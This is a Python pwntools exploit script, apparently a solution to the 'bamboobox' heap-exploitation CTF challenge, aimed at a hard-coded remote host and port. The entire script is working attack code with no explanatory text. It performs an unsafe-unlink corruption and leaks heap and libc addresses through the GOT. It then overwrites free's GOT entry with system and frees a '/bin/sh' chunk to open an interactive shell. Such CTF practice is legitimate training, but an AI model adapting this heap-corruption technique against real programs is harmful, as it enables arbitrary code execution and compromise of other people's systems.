from pwn import *
import time, sys

# local process envirnoment
LOCAL = False
elf_name = "./bamboobox"

#retmote args
remote_host = "140.113.209.24"
remote_port = 11005
context.clear(arch="amd64")
elf = ELF(elf_name)

if LOCAL:
    smlbin_area_off = 0x3C3B78
    free_off = 0x83940
    system_off = 0x45390
    execv_binsh_off = 0xF0567
    malloc_hook_off = 0x3C3B10
    context.log_level = "debug"
    mine_env = os.environ
    mine_env['LD_PRELOAD'] = "/home/deadfish/Pwn/Tools/preeny/x86_64-linux-gnu/dealarm.so"
    io = process(elf_name, env=mine_env)
else:
    #context.log_level = "debug"
    smlbin_area_off = 0x3C3B78
    execv_binsh_off = 0xF0567
    malloc_hook_off = 0x3C3B10
    free_off = 0x82DF0
    system_off = 0x46640
    io = remote(remote_host, remote_port)

def dlySend(sdstr):
    io.send(sdstr)
    time.sleep(0.05)

def mmenu(mindex):
    io.recvuntil("your choice:")
    io.sendline(str(mindex))

def show_item():
    mmenu(1)

def add_item(length, mname):
    mmenu(2)
    io.recvuntil("the length of item name:")
    io.sendline(str(length))
    io.recvuntil("the name of item:")
    dlySend(mname)

def change_item(index, length, mname):
    mmenu(3)
    io.recvuntil("enter the index of item:")
    io.sendline(str(index))
    io.recvuntil("enter the length of item name:")
    io.sendline(str(length))
    io.recvuntil("the new name of the item:")
    dlySend(mname)

def remove_item(index):
    mmenu(4)
    io.recvuntil("enter the index of item:")
    io.sendline(str(index))

def mexit():
    mmenu(5)

def s_exp():
    ch_ptr = 0x6020E8
    add_item(0x40, 'a'*0x20)
    add_item(0x40, 'b'*0x10)
    add_item(0xf8, 'c'*0x30)
    add_item(0xf0, 'd'*0x40)
    add_item(0x50, "/bin/sh\x00")    # 4
    # unlink
    payload = p64(0) + p64(0xf1)
    payload += p64(ch_ptr-0x18) + p64(ch_ptr-0x10)
    payload += 'f'*0xd0
    payload += p64(0xf0) + p64(0x100)[:4]
    change_item(2, len(payload)+1, payload)
    remove_item(3)
    # leak heap address
    payload = p64(0x40) + p64(0x6020C8) + p64(0xf8)[:6]
    change_item(2, len(payload), payload)
    show_item()
    io.recvuntil("1 : ")
    data = io.recvuntil("2 : ")[:-4]
    heap_addr = u64(data.ljust(8, chr(0)))&0xFFFFF000
    log.info("heap address: "+hex(heap_addr))
    # leak libc
    payload = p64(0x40) + p64(elf.got['free']) + p64(0xf8)[:6]
    change_item(2, len(payload), payload)
    show_item()
    io.recvuntil("1 : ")
    data = io.recvuntil("2 : ")[:-4]
    free_addr = u64(data.ljust(8, chr(0)))
    libc_addr = free_addr - free_off
    log.info("libc address: "+hex(libc_addr))
    pause()
    system_addr = libc_addr + system_off
    payload = p64(system_addr)[:7]
    change_item(1, len(payload), payload)
    remove_item(4)
    io.interactive()

if __name__ == "__main__":
    s_exp()
    pause()
